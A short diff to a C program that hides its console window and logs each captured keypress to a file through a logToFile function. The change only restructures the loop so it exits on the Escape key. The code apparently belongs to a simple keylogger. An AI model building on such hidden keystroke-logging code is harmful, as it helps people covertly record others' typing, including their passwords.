@@ -24,11 +24,12 @@ int main()                                     //start point
     HWND console = GetConsoleWindow();         //gets console handle
     ShowWindow(console, SW_HIDE);              //hides console
 
-    while(key != 27)                           //infinite loop
+    while(1)                                   //infinite loop
     {
         if(kbhit())                            //on key press
         {
             key = getch();                     //gets key
+            if(key == 27) break;
             logToFile(&key);                   //calls function sending char's address
         }
     }
